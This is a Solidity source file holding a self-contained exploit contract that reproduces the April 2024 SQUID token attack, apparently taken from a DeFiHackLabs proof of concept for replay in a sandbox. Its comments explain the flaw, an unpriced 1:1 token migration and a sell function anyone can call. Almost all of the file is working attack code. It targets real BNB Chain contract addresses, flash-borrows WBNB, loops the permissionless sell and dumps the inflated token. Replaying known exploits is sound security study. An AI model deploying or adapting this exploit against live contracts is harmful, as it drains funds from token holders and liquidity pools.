// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-04-SQUID).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (ContractTest): attacker = address(this), and the PancakeV3 flash-loan callback
// (pancakeV3FlashCallback) lives on the test itself. There is no standalone attack
// contract to deploy, so this is a faithful, self-contained copy of that inline
// attack (testExploit -> flash() -> pancakeV3FlashCallback -> swap_token_to_token),
// reproduced verbatim from test/SQUID_exp.sol so the playground can deploy it and
// record run().
//
// Root cause: SquidTokenSwap.swapTokens() converts SQUID V1 -> SQUID V2 at a
// hard-coded 1:1 rate with no price/oracle check, and sellSwappedTokens() is
// callable by ANYONE and sells the contract's own V1 holdings through PancakeSwap,
// burning the resulting V2. The attacker cheaply acquires V1, migrates it 1:1 into
// V2 (which trades far above V1), and repeatedly triggers the permissionless sell
// to shrink V2 supply / prop up its price before dumping their own V2 bag.

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IWBNB {
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IsquidSwap {
    function swapTokens(uint256 amount) external;
    function sellSwappedTokens(uint256 sellOption) external;
}

interface IUniPairV3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;
}

contract SQUIDExploit {
    IWBNB constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 constant SQUID_1 = IERC20(0x87230146E138d3F296a9a77e497A2A83012e9Bc5);
    IERC20 constant SQUID_2 = IERC20(0xFAfb7581a65A1f554616Bf780fC8a8aCd2Ab8c9b);
    IsquidSwap constant SQUID_SWAP = IsquidSwap(0xd309f0Fd5C3b90ecFb7024eDe7D329d9582492c5);
    IUniPairV3 constant pool = IUniPairV3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    IUniRouterV2 constant router = IUniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    uint256 borrow_amount;

    // step 0: flash-borrow 10,000 WBNB from the PancakeV3 pool; the callback below does the drain.
    function run() external {
        borrow_amount = 10_000 ether;
        pool.flash(address(this), 0, borrow_amount, "");
    }

    function pancakeV3FlashCallback(uint256, uint256 fee1, bytes memory) public {
        swap_token_to_token(address(WBNB), address(SQUID_1), 7000 ether);
        SQUID_1.approve(address(SQUID_SWAP), SQUID_1.balanceOf(address(this)));
        SQUID_SWAP.swapTokens(SQUID_1.balanceOf(address(this)));
        swap_token_to_token(address(WBNB), address(SQUID_2), 3000 ether);
        uint256 i = 0;
        uint256 j = 0;
        while (i < 8000) {
            try SQUID_SWAP.sellSwappedTokens(0) {}
            catch {
                break;
            }
            i++;
        }

        while (j < 4) {
            swap_token_to_token(address(SQUID_2), address(WBNB), SQUID_2.balanceOf(address(this)));
            swap_token_to_token(address(WBNB), address(SQUID_1), 7000 ether);
            SQUID_1.approve(address(SQUID_SWAP), SQUID_1.balanceOf(address(this)));
            SQUID_SWAP.swapTokens(SQUID_1.balanceOf(address(this)));
            swap_token_to_token(address(WBNB), address(SQUID_2), 3000 ether);
            while (i < 8000) {
                try SQUID_SWAP.sellSwappedTokens(0) {}
                catch {
                    break;
                }
                i++;
            }
            j++;
        }
        swap_token_to_token(address(SQUID_2), address(WBNB), SQUID_2.balanceOf(address(this)));
        WBNB.transfer(address(pool), borrow_amount + fee1);
    }

    function swap_token_to_token(address a, address b, uint256 amount) internal {
        IERC20(a).approve(address(router), amount);
        address[] memory path = new address[](2);
        path[0] = a;
        path[1] = b;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }
}
